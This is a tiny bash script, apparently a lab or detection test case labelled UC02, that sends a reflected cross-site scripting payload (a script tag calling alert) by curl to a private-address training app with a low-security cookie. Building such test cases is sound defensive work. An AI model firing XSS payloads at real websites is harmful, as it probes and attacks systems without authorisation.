#!/bin/bash
echo "[*] UC02: Simulating Cross-Site Scripting (XSS)..."
curl -v "http://172.30.20.10/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>"      -H "Cookie: security=low; PHPSESSID=test"
